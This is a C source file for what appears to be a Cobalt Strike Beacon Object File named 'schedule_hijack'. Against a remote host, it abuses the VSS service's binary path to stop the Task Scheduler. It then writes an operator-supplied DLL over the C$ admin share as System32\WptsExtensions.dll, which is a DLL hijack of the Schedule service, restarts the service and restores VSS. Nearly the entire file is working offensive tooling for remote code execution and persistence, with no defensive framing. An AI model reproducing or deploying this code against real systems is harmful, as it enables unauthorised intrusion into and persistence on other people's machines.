#define _WIN32_WINNT 0x0600
#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#include "anticrash.c"
#include <winternl.h>
#include <stddef.h>
#include "ntdefs.h"
#include "injection.c"


#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wint-conversion"
char ** EServiceStatus = 1;
char ** EServiceStartup = 1;
char ** EServiceError = 1;
const char * gServiceName = 1;
#pragma GCC diagnostic pop


DWORD config_service(const char* Hostname, const char* cpServiceName, const char * binpath, DWORD errmode, DWORD startmode)
{
	DWORD dwResult = ERROR_SUCCESS;
	SC_HANDLE scManager = NULL;
	SC_HANDLE scService = NULL;

	// Open the service control manager
	scManager = ADVAPI32$OpenSCManagerA(Hostname, SERVICES_ACTIVE_DATABASEA, SC_MANAGER_CONNECT);
	if (NULL == scManager)
	{
		dwResult = KERNEL32$GetLastError();
		internal_printf("OpenSCManagerA failed (%lu)\n", dwResult);
		goto config_service_end;
	}

	// Open the service
	scService = ADVAPI32$OpenServiceA(scManager, cpServiceName, SERVICE_CHANGE_CONFIG);
	if (NULL == scService)
	{
		dwResult = KERNEL32$GetLastError();
		internal_printf("OpenServiceA failed (%lu)\n", dwResult);
		goto config_service_end;
	}

	// Set the service configuration
	if( FALSE == ADVAPI32$ChangeServiceConfigA(
			scService,
			SERVICE_NO_CHANGE,
			startmode,
			errmode,
			binpath,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL
		)
	)
	{
		dwResult = KERNEL32$GetLastError();
		internal_printf("ChangeServiceConfigA failed (%lu)\n", dwResult);
		goto config_service_end;
	}


config_service_end:

	if (scService)
	{
		ADVAPI32$CloseServiceHandle(scService);
		scService = NULL;
	}

	if (scManager)
	{
		ADVAPI32$CloseServiceHandle(scManager);
		scManager = NULL;
	}

	return dwResult;
}

DWORD start_service_41d(const char* Hostname, const char* cpServiceName)
{
	DWORD dwResult = ERROR_SUCCESS;
	SC_HANDLE scManager = NULL;
	SC_HANDLE scService = NULL;

	// Open the service control manager
	scManager = ADVAPI32$OpenSCManagerA(Hostname, SERVICES_ACTIVE_DATABASEA, SC_MANAGER_CONNECT);
	if (NULL == scManager)
	{
		dwResult = KERNEL32$GetLastError();
		internal_printf("OpenSCManagerA failed (%lX)\n", dwResult);
		goto start_service_end;
	}

	// Open the service
	scService = ADVAPI32$OpenServiceA(scManager, cpServiceName, SERVICE_START);
	if (NULL == scService)
	{
		dwResult = KERNEL32$GetLastError();
		internal_printf("OpenServiceA failed (%lX)\n", dwResult);
		goto start_service_end;
	}

	// Start the service
	if( FALSE == ADVAPI32$StartServiceA(scService, 0, NULL))
	{
		dwResult = KERNEL32$GetLastError();
		if (dwResult != 1053) {
			internal_printf("StartServiceA failed (%lX)\n", dwResult);
			goto start_service_end;
		}
		else {
			dwResult = ERROR_SUCCESS;
		}
	}

start_service_end:
	
	if (scService)
	{
		ADVAPI32$CloseServiceHandle(scService);
		scService = NULL;
	}

	if (scManager)
	{
		ADVAPI32$CloseServiceHandle(scManager);
		scManager = NULL;
	}
	
	return dwResult;
}

void init_enums()
{
	EServiceStatus = antiStringResolve(7, "SPACER", "STOPPED", "START_PENDING", "STOP_PENDING", "RUNNING", "CONTINUE_PENDING", "PAUSE_PENDING");
	EServiceStartup = antiStringResolve(5, "BOOT_DRIVER", "SYSTEM_START_DRIVER", "AUTO_START", "DEMAND_START", "DISABLED");
	EServiceError = antiStringResolve(4, "IGNORE", "NORMAL", "SEVERE", "CRITICAL");
}

char * resolveType(DWORD T)
{
	if(T == 0x1){
		return "KERNEL_DRIVER";
	 } else if (T == 0x2) {
		return "FILE_DRIVER";
	 } else if (T == 0x10 || T == 0x110) {
		return (T == 0x10) ? "WIN32_OWN" : "WIN32_OWN Interactive";
	 } else if (T == 0x20 || T == 0x120) {
		 return (T == 0x20) ? "WIN32_SHARED" : "WIN32_SHARED Interactive";
	 } else if (T == 0x50 ||T == 0xD0) {
		 return (T == 0x50) ? "USER_OWN" : "USER_OWN Instance";
	 } else if (T == 0x60 || T == 0xE0) {
		 return (T == 0x60) ? "USER_SHARED" : "USER_SHARED Instance";
	 } else{
		 return "UNKNOWN";
	 }
}

void cleanup_enums()
{
	intFree(EServiceStatus);
	intFree(EServiceStartup);
	intFree(EServiceError);
}

DWORD get_service_status_wait(SC_HANDLE scService)
{
	DWORD dwResult = ERROR_SUCCESS;
	SERVICE_STATUS serviceStatus;

	do
	{
		// let's get a clue as to what the service status is before we move on
		if (!ADVAPI32$QueryServiceStatus(scService, &serviceStatus))
		{
			dwResult = KERNEL32$GetLastError();
			break;
		}

		if (serviceStatus.dwCurrentState != 2 && serviceStatus.dwCurrentState != 3 && serviceStatus.dwCurrentState != 5 && serviceStatus.dwCurrentState != 6) {
			internal_printf("\t%-20s : %s\n", "CURRENT_STATUS", EServiceStatus[serviceStatus.dwCurrentState]);
			dwResult = ERROR_SUCCESS;
			break;
		}

		KERNEL32$Sleep(100);

	} while (1);

	return dwResult;
}

DWORD get_service_status(SC_HANDLE scService)
{
	DWORD dwResult = ERROR_SUCCESS;
	SERVICE_STATUS serviceStatus;

	do
	{
		// let's get a clue as to what the service status is before we move on
		if (!ADVAPI32$QueryServiceStatus(scService, &serviceStatus))
		{
			dwResult = KERNEL32$GetLastError();
			break;
		}

		internal_printf("\t%-20s : %s\n", "CURRENT_STATUS", EServiceStatus[serviceStatus.dwCurrentState]);

		
	} while (0);

	return dwResult;
}

char * make_long_str(LPSTR serviceinfo)
{
	DWORD i = 0;
	if(!serviceinfo || serviceinfo[0] == 0) //no depends
	{
		return "";
	} else if (serviceinfo[0] == SC_GROUP_IDENTIFIERA) // Names a service group
	{
		return serviceinfo;
	} else // Array is here, lets make it printable
	{ 
		while(! (serviceinfo[i] == 0 && serviceinfo[i+1] == 0)) // while we having hit the double null terminator
		{
			if(serviceinfo[i] == 0) {
				serviceinfo[i] = ' ';} // replace any null up to double null with a space
			i++;
		}
		return serviceinfo; // now its been modified
	}
	
}

DWORD get_service_config_full(SC_HANDLE scService)
{
	DWORD dwResult = ERROR_SUCCESS;
	LPQUERY_SERVICE_CONFIGA lpServiceConfig = NULL;
	DWORD cbBytesNeeded = 0;

	do
	{
		ADVAPI32$QueryServiceConfigA(scService, NULL, 0, &cbBytesNeeded);
		dwResult = KERNEL32$GetLastError();

		if (dwResult != ERROR_INSUFFICIENT_BUFFER)
		{
            break;
		}

		if ((lpServiceConfig = (LPQUERY_SERVICE_CONFIGA)intAlloc(cbBytesNeeded)) == NULL)
		{
            break;
		}

		if (!ADVAPI32$QueryServiceConfigA(scService, lpServiceConfig, cbBytesNeeded, &cbBytesNeeded))
		{
			dwResult = KERNEL32$GetLastError();
            break;
		}

		internal_printf(
"SERVICE_NAME: %s\n\
\t%-20s : %lx %s\n\
\t%-20s : %lx %s\n\
\t%-20s : %lx %s\n\
\t%-20s : %s\n\
\t%-20s : %s\n\
\t%-20s : %ld\n\
\t%-20s : %s\n\
\t%-20s : %s%s\n\
\t%-20s : %s\n",
gServiceName,
"TYPE", lpServiceConfig->dwServiceType, resolveType(lpServiceConfig->dwServiceType),
"START_TYPE", lpServiceConfig->dwStartType, EServiceStartup[lpServiceConfig->dwStartType],
"ERROR_CONTROL", lpServiceConfig->dwErrorControl, EServiceError[lpServiceConfig->dwErrorControl],
"BINARY_PATH_NAME", lpServiceConfig->lpBinaryPathName,
"LOAD_ORDER_GROUP", (lpServiceConfig->lpLoadOrderGroup) ? lpServiceConfig->lpLoadOrderGroup : "",
"TAG", lpServiceConfig->dwTagId,
"DISPLAY_NAME", lpServiceConfig->lpDisplayName,
"DEPENDENCIES", (lpServiceConfig->lpDependencies && lpServiceConfig->lpDependencies[0] == SC_GROUP_IDENTIFIERA) ?  "(GROUP) " : "", make_long_str(lpServiceConfig->lpDependencies),
"SERVICE_START_NAME", lpServiceConfig->lpServiceStartName
);
		//internal_printf("StartType: %s\nDisplayName: %s\nStartName: %s\nBinPath: %s\nLoadOrderGroup: %s\nError Mode: %s\n", EServiceStartup[lpServiceConfig->dwStartType], lpServiceConfig->lpDisplayName, lpServiceConfig->lpServiceStartName, lpServiceConfig->lpBinaryPathName, lpServiceConfig->lpLoadOrderGroup ? lpServiceConfig->lpLoadOrderGroup : "", EServiceError[lpServiceConfig->dwErrorControl]);
		
		dwResult = ERROR_SUCCESS;
	} while (0);

	if (lpServiceConfig)
	{
		intFree(lpServiceConfig);
	}

	return dwResult;
}

DWORD get_service_config_binpath(SC_HANDLE scService)
{
	DWORD dwResult = ERROR_SUCCESS;
	LPQUERY_SERVICE_CONFIGA lpServiceConfig = NULL;
	DWORD cbBytesNeeded = 0;

	do
	{
		ADVAPI32$QueryServiceConfigA(scService, NULL, 0, &cbBytesNeeded);
		dwResult = KERNEL32$GetLastError();

		if (dwResult != ERROR_INSUFFICIENT_BUFFER)
		{
            break;
		}

		if ((lpServiceConfig = (LPQUERY_SERVICE_CONFIGA)intAlloc(cbBytesNeeded)) == NULL)
		{
            break;
		}

		if (!ADVAPI32$QueryServiceConfigA(scService, lpServiceConfig, cbBytesNeeded, &cbBytesNeeded))
		{
			dwResult = KERNEL32$GetLastError();
            break;
		}

		internal_printf(
"SERVICE_NAME: %s\n\
\t%-20s : %s\n",
gServiceName,
"BINARY_PATH_NAME", lpServiceConfig->lpBinaryPathName
);
		//internal_printf("StartType: %s\nDisplayName: %s\nStartName: %s\nBinPath: %s\nLoadOrderGroup: %s\nError Mode: %s\n", EServiceStartup[lpServiceConfig->dwStartType], lpServiceConfig->lpDisplayName, lpServiceConfig->lpServiceStartName, lpServiceConfig->lpBinaryPathName, lpServiceConfig->lpLoadOrderGroup ? lpServiceConfig->lpLoadOrderGroup : "", EServiceError[lpServiceConfig->dwErrorControl]);
		
		dwResult = ERROR_SUCCESS;
	} while (0);

	if (lpServiceConfig)
	{
		intFree(lpServiceConfig);
	}

	return dwResult;
}

DWORD get_service_config_status(SC_HANDLE scService)
{
	DWORD dwResult = ERROR_SUCCESS;
	LPQUERY_SERVICE_CONFIGA lpServiceConfig = NULL;
	DWORD cbBytesNeeded = 0;

	do
	{
		ADVAPI32$QueryServiceConfigA(scService, NULL, 0, &cbBytesNeeded);
		dwResult = KERNEL32$GetLastError();

		if (dwResult != ERROR_INSUFFICIENT_BUFFER)
		{
            break;
		}

		if ((lpServiceConfig = (LPQUERY_SERVICE_CONFIGA)intAlloc(cbBytesNeeded)) == NULL)
		{
            break;
		}

		if (!ADVAPI32$QueryServiceConfigA(scService, lpServiceConfig, cbBytesNeeded, &cbBytesNeeded))
		{
			dwResult = KERNEL32$GetLastError();
            break;
		}

		internal_printf(
"SERVICE_NAME: %s\n",
gServiceName
);
		//internal_printf("StartType: %s\nDisplayName: %s\nStartName: %s\nBinPath: %s\nLoadOrderGroup: %s\nError Mode: %s\n", EServiceStartup[lpServiceConfig->dwStartType], lpServiceConfig->lpDisplayName, lpServiceConfig->lpServiceStartName, lpServiceConfig->lpBinaryPathName, lpServiceConfig->lpLoadOrderGroup ? lpServiceConfig->lpLoadOrderGroup : "", EServiceError[lpServiceConfig->dwErrorControl]);
		
		dwResult = ERROR_SUCCESS;
	} while (0);

	if (lpServiceConfig)
	{
		intFree(lpServiceConfig);
	}

	return dwResult;
}

DWORD query_config_full(const char* Hostname, LPCSTR cpServiceName)
{
	DWORD dwResult = ERROR_SUCCESS;
	SC_HANDLE scManager = NULL;
	SC_HANDLE scService = NULL;

	do
	{

		if ((scManager = ADVAPI32$OpenSCManagerA(Hostname, SERVICES_ACTIVE_DATABASEA, SC_MANAGER_CONNECT | GENERIC_READ)) == NULL)
		{
			dwResult = KERNEL32$GetLastError();
            break;
		}

		if ((scService = ADVAPI32$OpenServiceA(scManager, cpServiceName, GENERIC_READ)) == NULL)
		{
			dwResult = KERNEL32$GetLastError();
			break;
		}
		dwResult = get_service_config_full(scService);
		if(dwResult)
			break;
		dwResult = get_service_status(scService);

	} while (0);

	if (scService)
	{
		ADVAPI32$CloseServiceHandle(scService);
	}

	if (scManager)
	{
		ADVAPI32$CloseServiceHandle(scManager);
	}


	return dwResult;
}

DWORD query_config_binpath(const char* Hostname, LPCSTR cpServiceName)
{
	DWORD dwResult = ERROR_SUCCESS;
	SC_HANDLE scManager = NULL;
	SC_HANDLE scService = NULL;

	do
	{

		if ((scManager = ADVAPI32$OpenSCManagerA(Hostname, SERVICES_ACTIVE_DATABASEA, SC_MANAGER_CONNECT | GENERIC_READ)) == NULL)
		{
			dwResult = KERNEL32$GetLastError();
            break;
		}

		if ((scService = ADVAPI32$OpenServiceA(scManager, cpServiceName, GENERIC_READ)) == NULL)
		{
			dwResult = KERNEL32$GetLastError();
			break;
		}
		dwResult = get_service_config_binpath(scService);
		if(dwResult)
			break;

	} while (0);

	if (scService)
	{
		ADVAPI32$CloseServiceHandle(scService);
	}

	if (scManager)
	{
		ADVAPI32$CloseServiceHandle(scManager);
	}


	return dwResult;
}

DWORD query_config_status_wait(const char* Hostname, LPCSTR cpServiceName)
{
	DWORD dwResult = ERROR_SUCCESS;
	SC_HANDLE scManager = NULL;
	SC_HANDLE scService = NULL;

	do
	{

		if ((scManager = ADVAPI32$OpenSCManagerA(Hostname, SERVICES_ACTIVE_DATABASEA, SC_MANAGER_CONNECT | GENERIC_READ)) == NULL)
		{
			dwResult = KERNEL32$GetLastError();
            break;
		}

		if ((scService = ADVAPI32$OpenServiceA(scManager, cpServiceName, GENERIC_READ)) == NULL)
		{
			dwResult = KERNEL32$GetLastError();
			break;
		}
		dwResult = get_service_config_status(scService);
		if(dwResult)
			break;
		dwResult = get_service_status_wait(scService);

	} while (0);

	if (scService)
	{
		ADVAPI32$CloseServiceHandle(scService);
	}

	if (scManager)
	{
		ADVAPI32$CloseServiceHandle(scManager);
	}


	return dwResult;
}

DWORD query_config_status(const char* Hostname, LPCSTR cpServiceName)
{
	DWORD dwResult = ERROR_SUCCESS;
	SC_HANDLE scManager = NULL;
	SC_HANDLE scService = NULL;

	do
	{

		if ((scManager = ADVAPI32$OpenSCManagerA(Hostname, SERVICES_ACTIVE_DATABASEA, SC_MANAGER_CONNECT | GENERIC_READ)) == NULL)
		{
			dwResult = KERNEL32$GetLastError();
            break;
		}

		if ((scService = ADVAPI32$OpenServiceA(scManager, cpServiceName, GENERIC_READ)) == NULL)
		{
			dwResult = KERNEL32$GetLastError();
			break;
		}
		dwResult = get_service_config_status(scService);
		if(dwResult)
			break;
		dwResult = get_service_status(scService);

	} while (0);

	if (scService)
	{
		ADVAPI32$CloseServiceHandle(scService);
	}

	if (scManager)
	{
		ADVAPI32$CloseServiceHandle(scManager);
	}


	return dwResult;
}

DWORD write_file(char** dllPath, int dllDataLen, char* dllData) 
{
	// Write file to disk
	DWORD dwWrite = 0;
	DWORD dwResult = ERROR_SUCCESS;
	HANDLE hwFile = NULL;

	do
	{
		hwFile = KERNEL32$CreateFileA((LPCSTR)dllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hwFile == NULL || hwFile == INVALID_HANDLE_VALUE)
		{
			dwResult = KERNEL32$GetLastError();
			internal_printf("write_file.CreateFileA failed (%lu)\n", dwResult);
			KERNEL32$CloseHandle(hwFile);
			break;
		}
		else
		{
			KERNEL32$WriteFile(hwFile, dllData, dllDataLen-4, &dwWrite, NULL);
			if (dwWrite==0)
			{
				dwResult = KERNEL32$GetLastError();
				internal_printf("write_file.WriteFile failed (%lu)\n", dwResult);
				KERNEL32$CloseHandle(hwFile);
				break;
			}
			else
			{
				internal_printf("WRITE_FILE: \n\
\t%-20s : %s\n\
\t%-20s : %i\n\
\t%-20s : %i\n", 
"DLL_PATH", dllPath,
"BYTES_WRITTEN", dllDataLen-4,
"ERROR", dwResult);
			}
		}
	} while (0);
	if (hwFile) 
	{
		KERNEL32$CloseHandle(hwFile);
	}

	return dwResult;
}

#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	datap parser;
	const char * hostname = NULL;
	char* dllPath[100] = {0};
	char* dllData;
	int dllDataLen;
	DWORD cleanup = 0;

	init_enums();
	BeaconDataParse(&parser, Buffer, Length);
	hostname = BeaconDataExtract(&parser, NULL);
	dllDataLen = BeaconDataLength(&parser);
	dllData = BeaconDataExtract(&parser, NULL);
	MSVCRT$strcat((char*)dllPath, "\\\\");
	MSVCRT$strcat((char*)dllPath, hostname);
	MSVCRT$strcat((char*)dllPath, "\\C$\\Windows\\System32\\WptsExtensions.dll");
	// cleanup = (DWORD)BeaconDataShort(&parser);

	if(!bofstart())
	{
		return;
	}

	internal_printf("schedule_hijack:\n");
	internal_printf("  hostname:    %s\n", hostname);
	internal_printf("  dll size:    %i\n", dllDataLen-4);
	internal_printf("  dll path:    %s\n", dllPath);
	// internal_printf("  cleanup:     %lX\n", cleanup);
	
	gServiceName = "schedule";
	dwErrorCode = query_config_status(hostname, "schedule");
	if(dwErrorCode != S_OK)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query service: %u\n\n", dwErrorCode);
		goto cleanup;
	}

	gServiceName = "vss";
	dwErrorCode = config_service(hostname, "vss", "sc.exe stop schedule", 0, 3);
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] config_service failed: %lu\n\n", dwErrorCode);
		goto cleanup;
	}

	dwErrorCode = query_config_binpath(hostname, "vss");
	if(dwErrorCode != S_OK)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query service: %u\n\n", dwErrorCode);
		goto cleanup;
	}

	dwErrorCode = start_service_41d(hostname, "vss");
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] start_service failed: %lX\n\n", dwErrorCode);
		goto cleanup;
	}

	gServiceName = "schedule";
	dwErrorCode = query_config_status_wait(hostname, "schedule");
	if(dwErrorCode != S_OK)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query service: %u\n\n", dwErrorCode);
		goto cleanup;
	}

	//Write DLL to disk
	dwErrorCode = write_file(dllPath, dllDataLen, dllData);
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] write_file failed: %lX\n\n", dwErrorCode);
		goto cleanup;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS\n\n");

cleanup:

	gServiceName = "vss";
	dwErrorCode = config_service(hostname, "vss", "sc.exe start schedule", 0, 3);
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] config_service failed: %lu\n\n", dwErrorCode);
		goto go_end;
	}

	dwErrorCode = query_config_binpath(hostname, "vss");
	if(dwErrorCode != S_OK)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query service: %u\n\n", dwErrorCode);
		goto go_end;
	}

	dwErrorCode = start_service_41d(hostname, "vss");
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] start_service failed: %lX\n\n", dwErrorCode);
		goto go_end;
	}

	gServiceName = "schedule";
	dwErrorCode = query_config_status_wait(hostname, "schedule");
	if(dwErrorCode != S_OK)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query service: %u\n\n", dwErrorCode);
		goto go_end;
	}

	gServiceName = "vss";
	dwErrorCode = config_service(hostname, "vss", "C:\\Windows\\System32\\vssvc.exe", 0, 3);
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] config_service failed: %lu\n\n", dwErrorCode);
		goto go_end;
	}

	dwErrorCode = query_config_full(hostname, "vss");
	if(dwErrorCode != S_OK)
	{
		BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query service: %u\n\n", dwErrorCode);
		goto go_end;
	}

go_end:
	printoutput(TRUE);

	cleanup_enums();
	
	bofstop();
};
#else
#define TEST_HOSTNAME        ""
#define TEST_SVC_NAME        "BOF_SVC_NAME"
#define TEST_BIN_PATH        "C:\\Windows\\System32\\alg.exe"
int main(int argc, char ** argv)
{
	DWORD  dwErrorCode       = ERROR_SUCCESS;
	LPCSTR lpcszHostName     = TEST_HOSTNAME;
	LPCSTR lpcszServiceName  = TEST_SVC_NAME;
	LPCSTR lpcszBinPath      = TEST_BIN_PATH;
	DWORD  dwErrorMode       = SERVICE_ERROR_IGNORE;
	DWORD  dwStartMode       = SERVICE_AUTO_START;
	
	internal_printf("config_service:\n");
	internal_printf("  lpcszHostName:    %s\n", lpcszHostName);
	internal_printf("  lpcszServiceName: %s\n", lpcszServiceName);
	internal_printf("  lpcszBinPath:     %s\n", lpcszBinPath);
	internal_printf("  dwErrorMode:      %lX\n", dwErrorMode);
	internal_printf("  dwStartMode:      %lX\n", dwStartMode);

	dwErrorCode = config_service(
		lpcszHostName, 
		lpcszServiceName, 
		lpcszBinPath, 
		dwErrorMode, 
		dwStartMode
	);
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "config_service failed: %lX\n", dwErrorCode);
		goto main_end;
	}

	internal_printf("SUCCESS.\n");

main_end:

	return dwErrorCode;
}
#endif
